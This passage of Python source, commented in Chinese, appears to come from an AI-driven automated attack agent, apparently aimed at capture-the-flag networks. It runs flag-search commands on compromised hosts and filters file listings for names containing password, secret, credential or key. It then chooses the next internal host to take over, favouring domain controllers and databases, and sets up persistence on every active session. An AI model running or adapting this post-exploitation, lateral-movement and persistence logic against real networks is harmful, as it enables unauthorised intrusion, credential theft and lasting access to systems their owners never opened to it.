                                key=lambda x: x.get("priority", 5))

    except Exception as e:
        logger.warning(f"AI搜索策略生成失败: {e}")
        # 降级到基础搜索
        if os_type == "windows":
            search_commands = [
                {"cmd": "type C:\\flag.txt", "purpose": "根目录flag文件", "priority": 1},
                {"cmd": "type C:\\flags\\flag.txt", "purpose": "flags目录", "priority": 2},
            ]
        else:
            search_commands = [
                {"cmd": "cat /flag 2>/dev/null", "purpose": "根目录flag", "priority": 1},
                {"cmd": "cat /flag.txt 2>/dev/null", "purpose": "flag.txt", "priority": 2},
            ]

    # Step 3: 执行搜索
    for search_action in search_commands[:10]:  # 最多执行10个搜索命令
        cmd = search_action.get("cmd", "")
        if not cmd:
            continue

        try:
            result = execute_on_session(session, cmd, timeout=30)
            if result.success and result.output:
                # 提取flag - 收集所有flag，不提前break
                found = extract_flags_from_text(result.output)
                if found:
                    flags.extend(found)
                    for f in found:
                        logger.info(f"在 {host} 发现flag: {f[:50]}...")
        except Exception as e:
            logger.debug(f"搜索命令失败: {cmd} - {e}")
            continue

    return list(set(flags))


def _identify_suspicious_files(output: str, os_type: str) -> List[str]:
    """
    从目录列表中识别可疑文件

    可疑文件特征:
    - 包含flag关键字的文件名
    - txt文件
    - 隐藏文件
    """
    import re

    suspicious = []

    # 文件名模式
    suspicious_patterns = [
        r'flag',
        r'key',
        r'secret',
        r'password',
        r'credential',
        r'\.txt$',
        r'\.ini$',
        r'\.conf$',
        r'\.cfg$',
    ]

    lines = output.strip().split('\n')

    for line in lines:
        # 提取文件名
        if os_type == "windows":
            # Windows dir输出: 文件名直接显示
            parts = line.split()
            if parts:
                filename = parts[-1]  # 最后一个部分通常是文件名
        else:
            # Linux ls -la输出: 权限 链接 所属 组 大小 月 日 时间 文件名
            parts = line.split()
            if len(parts) >= 9:
                filename = parts[-1]
            else:
                filename = line.strip()

        # 检查是否匹配可疑模式
        for pattern in suspicious_patterns:
            if re.search(pattern, filename, re.IGNORECASE):
                suspicious.append(filename)
                break

    return suspicious[:10]  # 限制数量


def get_next_internal_target(state: Dict) -> str:
    """
    获取下一个需要攻陷的内网目标

    优先级:
    1. 未攻陷的高价值主机 (域控、数据库)
    2. 未攻陷的普通主机（排除失败主机）
    3. 空字符串 (所有主机已攻陷或已失败)
    """
    internal_hosts = state.get("internal_hosts") or []
    compromised_hosts = state.get("compromised_hosts") or []
    active_sessions = state.get("active_sessions") or []
    failed_hosts = state.get("failed_lateral_hosts") or []

    # 从活跃会话中也获取已攻陷主机
    session_hosts = [s.get("host") for s in active_sessions if s.get("host")]
    all_compromised = set(compromised_hosts + session_hosts)
    all_excluded = set(compromised_hosts + session_hosts + failed_hosts)

    # 高价值端口 - 使用配置
    high_value_ports = config.HIGH_VALUE_PORTS

    # 优先选择高价值目标（排除失败主机）
    for host in internal_hosts:
        if not isinstance(host, dict):
            continue
        ip = host.get("ip", "")
        if not ip or ip in all_excluded:
            continue

        ports = host.get("ports") or []
        port_numbers = [p.get("port") for p in ports if isinstance(p, dict) and p.get("port")]

        if any(p in port_numbers for p in high_value_ports):
            return ip

    # 选择第一个未攻陷且未失败的主机
    for host in internal_hosts:
        if not isinstance(host, dict):
            continue
        ip = host.get("ip", "")
        if ip and ip not in all_excluded:
            return ip

    return ""  # 所有主机已攻陷或已失败


def persistence_node(state: Dict) -> Dict:
    """
    AI驱动的持久化节点

    在攻陷主机后建立持久化访问，确保会话不会丢失
    设计原则: 简洁、AI驱动、无硬编码规则
    """
    if not ADVANCED_OPS_AVAILABLE:
        logger.warning("Advanced operations not available, skipping persistence")
        return {"persistence_established": False}

    active_sessions = state.get("active_sessions") or []

    if not active_sessions:
        return {"persistence_established": False}

    updates = {
        "persistence_results": [],
        "persistence_established": False
    }

    # 为所有活跃会话建立持久化
    for session in active_sessions:
        host = session.get("host", "unknown")

        # 调用AI驱动的持久化处理器
        result = PersistenceHandler.establish_persistence(session)

        persistence_record = {
            "host": host,
            "success": result.status == OperationStatus.SUCCESS,
            "method": result.data.get("method") if result.data else None,
            "message": result.message
        }
        updates["persistence_results"].append(persistence_record)

        if persistence_record["success"]:
            updates["persistence_established"] = True
            logger.info(f"[Persistence] {host}: {result.message}")

    return updates